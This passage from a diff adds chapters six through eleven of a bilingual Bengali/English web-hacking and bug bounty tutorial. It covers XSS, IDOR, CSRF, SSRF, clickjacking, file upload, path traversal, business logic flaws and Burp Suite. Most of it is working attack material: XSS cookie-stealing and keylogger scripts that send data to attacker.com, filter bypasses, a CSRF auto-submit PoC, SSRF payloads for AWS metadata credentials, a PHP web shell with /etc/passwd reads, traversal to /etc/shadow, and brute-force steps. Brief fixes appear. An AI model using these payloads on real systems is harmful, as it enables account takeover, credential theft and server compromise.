+        <li>🔒 <span class="bn-text">Fix: Parameterized queries ব্যবহার করো</span><span class="en-text">Fix: Use parameterized queries</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════════════════
+     CH 6: XSS
+══════════════════════════════════ -->
+<div class="chapter ch6">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 06</div>
+    <div class="chapter-title">🔮 Cross-Site Scripting (XSS)</div>
+    <div class="chapter-desc"><span class="bn-text">ওয়েবসাইটে JavaScript inject করে victim-এর browser-এ কোড চালানো</span><span class="en-text">Injecting JavaScript into a website to run code in the victim's browser</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🤔 XSS কী?</h2>
+    <p><span class="bn-text">XSS হয় যখন ওয়েবসাইট user-এর input sanitize না করে সরাসরি page-এ দেখায়। এতে attacker JavaScript code inject করতে পারে যা অন্য user-এর browser-এ চলে।</span><span class="en-text">XSS occurs when a website displays user input directly on the page without sanitizing it. This allows an attacker to inject JavaScript that runs in other users' browsers.</span></p>
+
+    <div class="grid3">
+      <div class="card danger-card">
+        <h4>🔴 Reflected XSS</h4>
+        <p><span class="bn-text">URL-এ payload থাকে। ব্যবহারকারী link-এ click করলে তাৎক্ষণিক execute হয়। Server-এ store হয় না।</span><span class="en-text">Payload is in the URL. Executes immediately when user clicks the link. Not stored on server.</span></p>
+      </div>
+      <div class="card orange-card">
+        <h4>🟠 Stored XSS</h4>
+        <p><span class="bn-text">Comment, profile-এ payload store হয়। যে কেউ page দেখলেই execute হয়। সবচেয়ে বিপজ্জনক।</span><span class="en-text">Payload stored in comments, profiles. Executes for everyone who views the page. Most dangerous.</span></p>
+      </div>
+      <div class="card purple-card">
+        <h4>🟣 DOM XSS</h4>
+        <p><span class="bn-text">Server-এর সাথে কোনো সম্পর্ক নেই। JavaScript নিজেই DOM manipulate করার সময় হয়।</span><span class="en-text">No server involvement. Happens when JavaScript manipulates the DOM unsafely.</span></p>
+      </div>
+    </div>
+
+    <h2 class="sec">🧪 XSS Testing Payloads</h2>
+    <div class="code"><span class="c">-- Basic test --</span>
+<span class="r">&lt;script&gt;alert(1)&lt;/script&gt;</span>
+<span class="r">&lt;script&gt;alert('XSS')&lt;/script&gt;</span>
+<span class="r">&lt;img src=x onerror=alert(1)&gt;</span>
+
+<span class="c">-- Filter bypass --</span>
+<span class="r">&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</span>              <span class="c"># case variation</span>
+<span class="r">&lt;svg onload=alert(1)&gt;</span>                    <span class="c"># SVG tag</span>
+<span class="r">&lt;body onload=alert(1)&gt;</span>
+<span class="r">javascript:alert(1)</span>                       <span class="c"># href-এ</span>
+<span class="r">&lt;img src="x" onerror="alert(document.cookie)"&gt;</span>
+
+<span class="c">-- Cookie steal করার payload --</span>
+<span class="r">&lt;script&gt;
+  document.location='https://attacker.com/steal?c='+document.cookie
+&lt;/script&gt;</span>
+
+<span class="c">-- Keylogger payload --</span>
+<span class="r">&lt;script&gt;
+  document.onkeypress = function(e) {
+    fetch('https://attacker.com/log?k=' + e.key);
+  }
+&lt;/script&gt;</span></div>
+
+    <h2 class="sec">🔍 <span class="bn-text">XSS কোথায় খুঁজবো?</span><span class="en-text">Where to Look for XSS?</span></h2>
+    <ul>
+      <li>🔍 <span class="bn-text">Search box — সার্চ করলে input reflect হয়</span><span class="en-text">Search box — input is reflected in search</span></li>
+      <li>💬 <span class="bn-text">Comment/Review section — stored XSS</span><span class="en-text">Comment/Review section — stored XSS</span></li>
+      <li>👤 <span class="bn-text">Profile fields (name, bio) — stored XSS</span><span class="en-text">Profile fields (name, bio) — stored XSS</span></li>
+      <li>📧 <span class="bn-text">Error messages — input reflect করে</span><span class="en-text">Error messages — reflects input</span></li>
+      <li>🔗 <span class="bn-text">URL parameters — reflected XSS</span><span class="en-text">URL parameters — reflected XSS</span></li>
+      <li>📝 <span class="bn-text">Form inputs যেগুলো page-এ দেখায়</span><span class="en-text">Form inputs that display on page</span></li>
+    </ul>
+
+    <div class="box info">
+      <div class="box-t">🛡️ <span class="bn-text">XSS ঠেকানোর উপায়</span><span class="en-text">How to Prevent XSS</span></div>
+      <ul>
+        <li><span class="bn-text">Output encode করো: <code>&lt;</code> → <code>&amp;lt;</code></span></li>
+        <li><span class="bn-text">Content Security Policy (CSP) header দাও</span><span class="en-text">Add Content Security Policy (CSP) header</span></li>
+        <li><span class="bn-text">Cookie-তে HttpOnly flag দাও</span><span class="en-text">Add HttpOnly flag to cookies</span></li>
+        <li><span class="bn-text">DOMPurify library ব্যবহার করো</span><span class="en-text">Use DOMPurify library</span></li>
+      </ul>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>📌 <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>🔮 <span class="bn-text">XSS = অন্যের browser-এ JavaScript চালানো</span><span class="en-text">XSS = running JavaScript in someone else's browser</span></li>
+        <li>🔴 <span class="bn-text">Reflected = URL-এ, Stored = Database-এ, DOM = JavaScript-এ</span></li>
+        <li>🍪 <span class="bn-text">Cookie steal করে Account Takeover সম্ভব</span><span class="en-text">Stealing cookies enables Account Takeover</span></li>
+        <li>🧪 <span class="bn-text">Basic test: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════════════════
+     CH 7: Auth & IDOR
+══════════════════════════════════ -->
+<div class="chapter ch7">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 07</div>
+    <div class="chapter-title">🔐 <span class="bn-text">Broken Authentication ও IDOR</span><span class="en-text">Broken Authentication & IDOR</span></div>
+    <div class="chapter-desc"><span class="bn-text">Login bypass, অন্যের account দেখা এবং Insecure Direct Object Reference</span><span class="en-text">Login bypass, viewing others' accounts and Insecure Direct Object Reference</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🔑 <span class="bn-text">Broken Authentication</span><span class="en-text">Broken Authentication</span></h2>
+    <p><span class="bn-text">Authentication যদি দুর্বলভাবে implement করা হয়, তাহলে attacker account দখল করতে পারে।</span><span class="en-text">If authentication is poorly implemented, an attacker can take over accounts.</span></p>
+
+    <table>
+      <thead><tr><th><span class="bn-text">দুর্বলতা</span><span class="en-text">Weakness</span></th><th><span class="bn-text">আক্রমণ</span><span class="en-text">Attack</span></th><th><span class="bn-text">উদাহরণ</span><span class="en-text">Example</span></th></tr></thead>
+      <tbody>
+        <tr><td><span class="bn-text">Rate limiting নেই</span><span class="en-text">No rate limiting</span></td><td>Brute Force</td><td><span class="bn-text">লক্ষ লক্ষ password try</span><span class="en-text">Trying millions of passwords</span></td></tr>
+        <tr><td><span class="bn-text">দুর্বল password policy</span><span class="en-text">Weak password policy</span></td><td>Credential Stuffing</td><td><span class="bn-text">leaked password list ব্যবহার</span><span class="en-text">Using leaked password lists</span></td></tr>
+        <tr><td><span class="bn-text">Predictable token</span><span class="en-text">Predictable token</span></td><td>Token Prediction</td><td><span class="bn-text">Reset token = timestamp</span><span class="en-text">Reset token = timestamp</span></td></tr>
+        <tr><td><span class="bn-text">JWT misconfiguration</span></td><td>Algorithm confusion</td><td><code>alg: none</code></td></tr>
+        <tr><td><span class="bn-text">Default credentials</span></td><td>Login</td><td><code>admin:admin</code></td></tr>
+      </tbody>
+    </table>
+
+    <h3 class="sub"><span class="bn-text">Brute Force — Burp Intruder দিয়ে</span><span class="en-text">Brute Force — with Burp Intruder</span></h3>
+    <div class="step"><div class="step-num">1</div><div class="step-body"><span class="bn-text">Login request Burp-এ intercept করো</span><span class="en-text">Intercept login request in Burp</span></div></div>
+    <div class="step"><div class="step-num">2</div><div class="step-body"><span class="bn-text">Right click → Send to Intruder</span></div></div>
+    <div class="step"><div class="step-num">3</div><div class="step-body"><span class="bn-text">Password field-এ § চিহ্ন দাও (position mark)</span><span class="en-text">Mark the password field with § (position mark)</span></div></div>
+    <div class="step"><div class="step-num">4</div><div class="step-body"><span class="bn-text">Payload → wordlist লোড করো → Attack!</span></div></div>
+
+    <h2 class="sec">🆔 IDOR — <span class="bn-text">অন্যের Data দেখা</span><span class="en-text">Viewing Others' Data</span></h2>
+    <p><span class="bn-text">IDOR (Insecure Direct Object Reference) হয় যখন server user-এর permission check না করে শুধু ID দিয়ে data দিয়ে দেয়।</span><span class="en-text">IDOR occurs when the server gives data based only on an ID without checking the user's permission.</span></p>
+
+    <div class="vuln-card">
+      <div class="vuln-header">
+        <h4>🆔 IDOR Example</h4>
+        <span class="sev sev-high">HIGH</span>
+      </div>
+      <div class="vuln-body">
+        <div class="code" style="margin:0;"><span class="c"># তোমার profile URL</span>
+<span class="url">https://target.com/api/user/1337/profile</span>
+                               <span class="r">^^^^</span>
+                               <span class="r">তোমার user ID</span>
+
+<span class="c"># ID 1338 try করলে অন্যের profile দেখা যায়?</span>
+<span class="url">https://target.com/api/user/1338/profile</span>
+
+<span class="c"># অন্য IDOR targets</span>
+<span class="url">https://target.com/invoice?id=1001</span>   <span class="c"># → id=1002?</span>
+<span class="url">https://target.com/download?file=user1337.pdf</span>
+<span class="url">https://target.com/api/orders/5678</span></div>
+      </div>
+    </div>
+
+    <div class="code"><span class="c"># Burp Intruder দিয়ে IDOR test</span>
+<span class="c"># Request: GET /api/user/§1337§/data</span>
+<span class="c"># Payload type: Numbers, From 1 to 10000</span>
+<span class="c"># Response length compare করো — আলাদা হলে IDOR!</span>
+
+<span class="c"># UUID/GUID-এ IDOR?</span>
+<span class="url">https://target.com/api/user/550e8400-e29b-41d4-a716-446655440000</span>
+<span class="c"># এগুলো random দেখালেও কখনো predictable হয়</span></div>
+
+    <div class="box success">
+      <div class="box-t">💰 <span class="bn-text">IDOR Bug Bounty-তে অনেক পাওয়া যায়!</span><span class="en-text">IDOR earns a lot in Bug Bounty!</span></div>
+      <span class="bn-text">IDOR সহজে পাওয়া যায় এবং impact বেশি হওয়ায় Bug Bounty-তে $500 থেকে $10,000+ পাওয়া সাধারণ।</span>
+      <span class="en-text">IDOR is easy to find and has high impact, so earning $500 to $10,000+ in Bug Bounty is common.</span>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>📌 <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>🔑 <span class="bn-text">Broken Auth = দুর্বল login → account takeover</span><span class="en-text">Broken Auth = weak login → account takeover</span></li>
+        <li>🔢 <span class="bn-text">Brute Force = Burp Intruder + wordlist</span></li>
+        <li>🆔 <span class="bn-text">IDOR = ID বদলে অন্যের data দেখা যায়?</span><span class="en-text">IDOR = change ID to see others' data?</span></li>
+        <li>💰 <span class="bn-text">IDOR = Bug Bounty-তে সহজ এবং ভালো reward</span><span class="en-text">IDOR = easy find and good reward in Bug Bounty</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════════════════
+     CH 8: CSRF, SSRF, Clickjacking
+══════════════════════════════════ -->
+<div class="chapter ch8">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 08</div>
+    <div class="chapter-title">🎭 CSRF, SSRF <span class="bn-text">ও</span><span class="en-text">&</span> Clickjacking</div>
+    <div class="chapter-desc"><span class="bn-text">ব্যবহারকারীকে বা সার্ভারকে ফাঁদে ফেলানো — Request Forgery Attacks</span><span class="en-text">Trapping the user or server — Request Forgery Attacks</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🎭 CSRF — <span class="bn-text">ব্যবহারকারীকে দিয়ে কাজ করানো</span><span class="en-text">Forcing Users to Perform Actions</span></h2>
+    <p><span class="bn-text">CSRF (Cross-Site Request Forgery) হয় যখন attacker victim-কে একটা malicious link-এ click করায় এবং victim-এর browser স্বয়ংক্রিয়ভাবে target site-এ request পাঠায় (victim-এর cookie সহ)।</span><span class="en-text">CSRF occurs when an attacker tricks a victim into clicking a malicious link, and the victim's browser automatically sends a request to the target site (with the victim's cookies).</span></p>
+
+    <div class="vuln-card">
+      <div class="vuln-header"><h4>🎭 CSRF Attack Flow</h4><span class="sev sev-high">HIGH</span></div>
+      <div class="vuln-body">
+        <div class="diagram" style="margin:0;">
+<pre><span class="db">Victim</span> ← bank.com-এ logged in
+
+<span class="dr">Attacker</span> একটা evil page বানায়:
+<span class="dr">&lt;img src="https://bank.com/transfer?to=attacker&amp;amount=10000"&gt;</span>
+
+Victim evil page দেখে → Browser automatically request পাঠায়
+→ bank.com victim-এর cookie দেখে → <span class="dr">Transfer হয়ে যায়!</span>
+
+<span class="dg">Fix: CSRF Token — random hidden value যা attacker জানে না</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="code"><span class="c"># CSRF test করার পদ্ধতি</span>
+<span class="c"># 1. Burp-এ sensitive request intercept করো (password change, etc.)</span>
+<span class="c"># 2. Engagement tools → Generate CSRF PoC</span>
+<span class="c"># 3. HTML PoC তৈরি হবে:</span>
+
+<span class="k">&lt;html&gt;</span>
+  <span class="k">&lt;form</span> <span class="b">action</span>=<span class="s">"https://target.com/change-email"</span> <span class="b">method</span>=<span class="s">"POST"</span><span class="k">&gt;</span>
+    <span class="k">&lt;input</span> <span class="b">type</span>=<span class="s">"hidden"</span> <span class="b">name</span>=<span class="s">"email"</span> <span class="b">value</span>=<span class="s">"attacker@evil.com"</span><span class="k">/&gt;</span>
+    <span class="k">&lt;input</span> <span class="b">type</span>=<span class="s">"submit"</span> <span class="b">value</span>=<span class="s">"Click me!"</span><span class="k">/&gt;</span>
+  <span class="k">&lt;/form&gt;</span>
+  <span class="k">&lt;script&gt;</span>document.forms[0].submit()<span class="k">&lt;/script&gt;</span>
+<span class="k">&lt;/html&gt;</span>
+
+<span class="c"># CSRF Token আছে কিনা দেখো — না থাকলে vulnerable!</span></div>
+
+    <h2 class="sec">🖥️ SSRF — <span class="bn-text">সার্ভারকে দিয়ে request করানো</span><span class="en-text">Making the Server Fetch Resources</span></h2>
+    <p><span class="bn-text">SSRF (Server-Side Request Forgery)-তে attacker server-কে internal network-এ বা cloud metadata-তে request পাঠাতে বাধ্য করে।</span><span class="en-text">In SSRF, the attacker forces the server to make requests to internal networks or cloud metadata endpoints.</span></p>
+
+    <div class="code"><span class="c"># SSRF test payload</span>
+<span class="r">https://target.com/fetch?url=http://127.0.0.1/</span>
+<span class="r">https://target.com/fetch?url=http://localhost/admin</span>
+<span class="r">https://target.com/fetch?url=http://192.168.1.1/</span>
+
+<span class="c"># AWS Cloud Metadata (Cloud SSRF)</span>
+<span class="r">https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/</span>
+<span class="r">https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</span>
+<span class="c"># এই URL থেকে AWS credentials পাওয়া যেতে পারে!</span>
+
+<span class="c"># SSRF bypass techniques</span>
+<span class="r">http://0x7f000001/</span>          <span class="c"># 127.0.0.1 hex</span>
+<span class="r">http://2130706433/</span>          <span class="c"># 127.0.0.1 decimal</span>
+<span class="r">http://127.1/</span>               <span class="c"># shortened</span></div>
+
+    <h2 class="sec">👆 Clickjacking</h2>
+    <p><span class="bn-text">Target site-কে একটা transparent iframe-এ লোড করে victim-কে অজান্তে button-এ click করানো।</span><span class="en-text">Loading the target site in a transparent iframe to trick the victim into unknowingly clicking buttons.</span></p>
+    <div class="code"><span class="c"># Clickjacking test — X-Frame-Options নেই?</span>
+<span class="k">&lt;style&gt;</span>
+  iframe { opacity: 0.5; position: absolute; top: 0; left: 0; }
+<span class="k">&lt;/style&gt;</span>
+<span class="k">&lt;iframe</span> src=<span class="s">"https://target.com/delete-account"</span> 
+        width=<span class="n">800</span> height=<span class="n">600</span><span class="k">&gt;&lt;/iframe&gt;</span>
+<span class="k">&lt;button</span> style=<span class="s">"position:absolute; top:300px; left:400px"</span><span class="k">&gt;</span>
+  Win a Prize!
+<span class="k">&lt;/button&gt;</span>
+
+<span class="c"># X-Frame-Options: DENY থাকলে এটা কাজ করবে না</span></div>
+
+    <div class="chapter-summary">
+      <h3>📌 <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>🎭 <span class="bn-text">CSRF = victim-কে দিয়ে অজান্তে action করানো</span><span class="en-text">CSRF = making victim unknowingly perform actions</span></li>
+        <li>🖥️ <span class="bn-text">SSRF = server-কে দিয়ে internal request করানো</span><span class="en-text">SSRF = making server send internal requests</span></li>
+        <li>👆 <span class="bn-text">Clickjacking = transparent iframe দিয়ে ধোঁকা</span><span class="en-text">Clickjacking = tricking with transparent iframe</span></li>
+        <li>🔒 <span class="bn-text">Fix: CSRF Token, SameSite Cookie, X-Frame-Options</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════════════════
+     CH 9: File Upload & Path Traversal
+══════════════════════════════════ -->
+<div class="chapter ch9">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 09</div>
+    <div class="chapter-title">📁 <span class="bn-text">File Upload ও Path Traversal</span><span class="en-text">File Upload & Path Traversal</span></div>
+    <div class="chapter-desc"><span class="bn-text">Malicious file upload করে RCE পাওয়া এবং directory traversal দিয়ে ফাইল পড়া</span><span class="en-text">Getting RCE via malicious file upload and reading files via directory traversal</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">📤 File Upload Vulnerabilities</h2>
+    <p><span class="bn-text">অনেক সাইটে ফাইল upload করার সুবিধা থাকে (profile picture, document)। যদি proper validation না থাকে, তাহলে PHP/ASP shell upload করে Remote Code Execution (RCE) পাওয়া সম্ভব।</span><span class="en-text">Many sites allow file uploads (profile picture, document). Without proper validation, it's possible to upload a PHP/ASP shell and get Remote Code Execution (RCE).</span></p>
+
+    <div class="code"><span class="c">-- PHP Web Shell --</span>
+<span class="c"># shell.php নামে এই file upload করো</span>
+<span class="k">&lt;?php</span> system(<span class="b">$_GET</span>[<span class="s">'cmd'</span>]); <span class="k">?&gt;</span>
+
+<span class="c"># Upload হলে access করো:</span>
+<span class="url">https://target.com/uploads/shell.php?cmd=whoami</span>
+<span class="url">https://target.com/uploads/shell.php?cmd=ls+-la</span>
+<span class="url">https://target.com/uploads/shell.php?cmd=cat+/etc/passwd</span>
+
+<span class="c">-- Filter bypass techniques --</span>
+shell.php    → <span class="r">shell.php.jpg</span>      <span class="c"># double extension</span>
+shell.php    → <span class="r">shell.pHp</span>          <span class="c"># case variation</span>
+shell.php    → <span class="r">shell.php5</span>         <span class="c"># alternate extension</span>
+shell.php    → <span class="r">shell.php%00.jpg</span>   <span class="c"># null byte</span>
+
+<span class="c"># Content-Type bypass</span>
+<span class="c"># Burp-এ intercept করে Content-Type: image/jpeg বানাও</span>
+<span class="c"># কিন্তু body-তে PHP code রাখো</span></div>
+
+    <h2 class="sec">🗂️ Path Traversal — <span class="bn-text">Directory ভেদ করে ফাইল পড়া</span><span class="en-text">Reading Files Across Directories</span></h2>
+    <p><span class="bn-text">Server যদি user-দেওয়া file path sanitize না করে, তাহলে <code>../</code> দিয়ে server-এর যেকোনো ফাইল পড়া সম্ভব।</span><span class="en-text">If the server doesn't sanitize user-provided file paths, using <code>../</code> can read any file on the server.</span></p>
+
+    <div class="code"><span class="c"># Basic path traversal</span>
+<span class="url">https://target.com/file?name=../../../etc/passwd</span>
+<span class="url">https://target.com/file?name=../../../etc/shadow</span>
+<span class="url">https://target.com/file?name=../../../var/www/html/config.php</span>
+
+<span class="c"># Windows path</span>
+<span class="url">https://target.com/file?name=..\..\..\windows\system32\drivers\etc\hosts</span>
+
+<span class="c">-- Bypass techniques --</span>
+<span class="r">../</span>           → <span class="r">..%2f</span>       <span class="c"># URL encode</span>
+<span class="r">../</span>           → <span class="r">....//</span>      <span class="c"># double dot</span>
+<span class="r">../</span>           → <span class="r">..%252f</span>     <span class="c"># double encode</span>
+<span class="r">../</span>           → <span class="r">%2e%2e%2f</span>  <span class="c"># full encode</span></div>
+    <div class="output"><div class="output-label">⬇ /etc/passwd এর মতো দেখতে পাবে</div>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</div>
+
+    <div class="box danger">
+      <div class="box-t">🔥 File Upload + Path Traversal = RCE</div>
+      <span class="bn-text">File upload vulnerability পেলে web shell upload করো, তারপর path traversal দিয়ে shell-এর সঠিক path বের করো। এটা Critical severity।</span>
+      <span class="en-text">If you find file upload vulnerability, upload a web shell, then use path traversal to find the shell's correct path. This is Critical severity.</span>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>📌 <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>📤 <span class="bn-text">File Upload = PHP shell → RCE (Critical)</span></li>
+        <li>🔀 <span class="bn-text">Bypass: double extension, case variation, null byte</span></li>
+        <li>🗂️ <span class="bn-text">Path Traversal = <code>../</code> দিয়ে sensitive file পড়া</span><span class="en-text">Path Traversal = reading sensitive files with <code>../</code></span></li>
+        <li>🔒 <span class="bn-text">Fix: whitelist only, rename file, outside webroot-এ store</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════════════════
+     CH 10: Business Logic
+══════════════════════════════════ -->
+<div class="chapter ch10">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 10</div>
+    <div class="chapter-title">🧩 Business Logic Bugs</div>
+    <div class="chapter-desc"><span class="bn-text">Scanner ধরতে পারে না এমন বাগ — Manual testing-এর আসল শক্তি</span><span class="en-text">Bugs scanners can't find — the true power of manual testing</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🤔 <span class="bn-text">Business Logic Bug কী?</span><span class="en-text">What is a Business Logic Bug?</span></h2>
+    <p><span class="bn-text">এই ধরনের বাগ application-এর নিজস্ব business rule ভঙ্গ করে। কোনো injection বা technical exploit নেই — শুধু logic-এর দুর্বলতা। এগুলো automated scanner ধরতে পারে না — তাই manual testing দরকার।</span><span class="en-text">These bugs violate the application's own business rules. No injection or technical exploit — just logic flaws. Automated scanners can't find them — manual testing is needed.</span></p>
+
+    <h3 class="sub">💸 Price Manipulation</h3>
+    <div class="code"><span class="c"># কেনার সময় Burp-এ request intercept করো</span>
+<span class="c"># POST /checkout</span>
+<span class="c"># {"item_id": 123, "quantity": 1, "price": 99.99}</span>
+<span class="c">#                                          ↑↑↑↑↑</span>
+<span class="c"># price বদলে দাও:</span>
+<span class="c"># {"item_id": 123, "quantity": 1, "price": 0.01}</span>
+<span class="c"># বা negative price:</span>
+<span class="c"># {"item_id": 123, "quantity": 1, "price": -99.99}</span>
+
+<span class="c"># Quantity manipulation</span>
+<span class="c"># {"quantity": -1} → refund without purchase?</span></div>
+
+    <h3 class="sub">🏃 Race Condition</h3>
+    <p><span class="bn-text">একই সময়ে একাধিক request পাঠালে server ঠিকমতো handle করতে না পারলে double benefit পাওয়া যায়।</span><span class="en-text">Sending multiple requests at the same time can result in double benefits if the server can't handle it properly.</span></p>
+    <div class="code"><span class="c"># Burp Repeater-এ একই request ১০-২০টা পাঠাও simultaneously</span>
+<span class="c"># উদাহরণ: একটা coupon একাধিকবার ব্যবহার</span>
+<span class="c"># উদাহরণ: একটা gift card একাধিকবার redeem</span>
+<span class="c"># উদাহরণ: একটা free trial একাধিকবার activate</span>
+
+<span class="c"># Burp Turbo Intruder দিয়ে race condition test</span>
+<span class="c"># All requests simultaneously send করো</span></div>
+
+    <h3 class="sub">🔄 <span class="bn-text">Password Reset Logic Flaws</span><span class="en-text">Password Reset Logic Flaws</span></h3>
+    <div class="code"><span class="c"># Reset token predictable?</span>
+<span class="c"># Email 1-এর token: abc123_1705312200</span>
+<span class="c"># Email 2-এর token: xyz456_1705312201</span>
+<span class="c">#                           ^^^^^^^^^^</span>
+<span class="c">#                           Unix timestamp! Predictable!</span>
+
+<span class="c"># Token reuse</span>
+<span class="c"># Reset করার পরেও পুরনো token কাজ করে?</span>
+
+<span class="c"># Host header injection in reset link</span>
+<span class="c"># POST /forgot-password</span>
+<span class="c"># Host: attacker.com  ← বদলে দাও</span>
+<span class="c"># Reset link attacker.com-এ যাবে!</span></div>
+
+    <div class="box info">
+      <div class="box-t">🎯 <span class="bn-text">Business Logic বাগ খোঁজার টিপস</span><span class="en-text">Tips for Finding Business Logic Bugs</span></div>
+      <ul>
+        <li><span class="bn-text">সব parameter modify করে দেখো</span><span class="en-text">Try modifying every parameter</span></li>
+        <li><span class="bn-text">Negative number, zero, অনেক বড় সংখ্যা দাও</span><span class="en-text">Try negative numbers, zero, very large numbers</span></li>
+        <li><span class="bn-text">Steps skip করা যায়? Step 1 → Step 3?</span><span class="en-text">Can you skip steps? Step 1 → Step 3?</span></li>
+        <li><span class="bn-text">অন্য user-এর token নিজের account-এ use হয়?</span><span class="en-text">Can another user's token be used on your account?</span></li>
+        <li><span class="bn-text">Free plan-এ paid feature access হয়?</span><span class="en-text">Can free plan access paid features?</span></li>
+      </ul>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>📌 <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>🧩 <span class="bn-text">Business Logic = logic flaw, scanner ধরতে পারে না</span><span class="en-text">Business Logic = logic flaw, scanners can't find</span></li>
+        <li>💸 <span class="bn-text">Price manipulation = parameter modify করো</span><span class="en-text">Price manipulation = modify parameters</span></li>
+        <li>🏃 <span class="bn-text">Race Condition = simultaneous request</span></li>
+        <li>🔑 <span class="bn-text">Reset Token = predictable? reusable?</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════════════════
+     CH 11: Burp Suite Deep Dive
+══════════════════════════════════ -->
+<div class="chapter ch11">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 11</div>
+    <div class="chapter-title">🦆 Burp Suite — Deep Dive</div>
+    <div class="chapter-desc"><span class="bn-text">Proxy, Repeater, Intruder, Decoder, Comparer — হাতে-কলমে শেখা</span><span class="en-text">Proxy, Repeater, Intruder, Decoder, Comparer — hands-on learning</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🔄 Proxy — <span class="bn-text">Request দেখা ও পরিবর্তন</span><span class="en-text">Viewing & Modifying Requests</span></h2>
+    <div class="code"><span class="c"># Proxy tab-এ যাও → Intercept: ON</span>
+<span class="c"># Browser-এ request করো</span>
+<span class="c"># Burp-এ request আটকাবে</span>
+
+<span class="c"># এখন তুমি পারবে:</span>
+<span class="c"># - Parameter বদলানো</span>
+<span class="c"># - Header যোগ/বাদ দেওয়া</span>
+<span class="c"># - Body modify করা</span>
+<span class="c"># - Request drop করা</span>
+<span class="c"># - Forward করা</span>
+
+<span class="c"># HTTP History → সব past request দেখো</span>
+<span class="c"># Right click → "Send to Repeater" / "Send to Intruder"</span></div>
+
+    <h2 class="sec">🔁 Repeater — <span class="bn-text">বারবার request পাঠানো</span><span class="en-text">Sending Requests Repeatedly</span></h2>
+    <div class="code"><span class="c"># Repeater-এ request পাঠাও → Send বাটন চাপো</span>
+<span class="c"># Response দেখো → Parameter বদলাও → আবার Send</span>
+
+<span class="c"># কখন ব্যবহার করবো:</span>
+<span class="c"># - SQLi payload manually test করতে</span>
+<span class="c"># - IDOR test করতে (id=1, id=2, id=3...)</span>
+<span class="c"># - XSS payload vary করতে</span>
+<span class="c"># - Authentication bypass test করতে</span>
+
+<span class="c"># Shortcut: Ctrl+R → Repeater-এ পাঠাও</span>
+<span class="c"># Shortcut: Ctrl+Space → Request পাঠাও</span></div>
+
+    <h2 class="sec">🎯 Intruder — <span class="bn-text">Automated Attack</span><span class="en-text">Automated Attack</span></h2>
+    <div class="code"><span class="c"># Attack Types:</span>
+<span class="c"># Sniper    → একটা position, একটা wordlist</span>
+<span class="c"># Battering Ram → সব position, একই payload</span>
+<span class="c"># Pitchfork → N position, N wordlist (parallel)</span>
+<span class="c"># Cluster Bomb → সব combination (brute force)</span>
+
+<span class="c"># Example: Login Brute Force</span>
+<span class="c"># POST /login</span>
+<span class="c"># username=admin&password=§PASS§</span>
+<span class="c">#                        ^----^</span>
+<span class="c"># Payload → Simple list → rockyou.txt</span>
+<span class="c"># Start Attack → Response length/status দেখো</span>
+<span class="c"># আলাদা response = সঠিক password!</span></div>
+
+    <h2 class="sec">🔓 Decoder — <span class="bn-text">Encode/Decode করা</span><span class="en-text">Encoding/Decoding</span></h2>
+    <div class="code"><span class="c"># Decoder tab → text paste করো</span>
+
+<span class="c"># Decode করতে:</span>
+Input:  <span class="y">YWRtaW46cGFzczEyMzQ=</span>
+Output: <span class="g">admin:pass1234</span>   <span class="c">(Base64 decode)</span>
+
+<span class="c"># Encode করতে:</span>
+Input:  <span class="y">&lt;script&gt;alert(1)&lt;/script&gt;</span>
+Output: <span class="g">%3Cscript%3Ealert%281%29%3C%2Fscript%3E</span>  <span class="c">(URL encode)</span>
+
+<span class="c"># Supported formats:</span>
+<span class="c"># URL, HTML, Base64, Hex, ASCII, Gzip</span></div>
+
+    <h2 class="sec">📊 Comparer — <span class="bn-text">দুটো Response তুলনা</span><span class="en-text">Comparing Two Responses</span></h2>
+    <div class="code"><span class="c"># দুটো response compare করো:</span>
+<span class="c"># Valid user vs invalid user response</span>
+<span class="c"># Admin vs normal user response</span>
+<span class="c"># সঠিক password vs ভুল password response</span>
+
+<span class="c"># User enumeration example:</span>
+<span class="c"># username=admin → "Invalid password" (user exists!)</span>
+<span class="c"># username=xyz   → "User not found" (different!)</span>
+<span class="c"># → User enumeration vulnerability!</span></div>
+
+    <div class="box success">
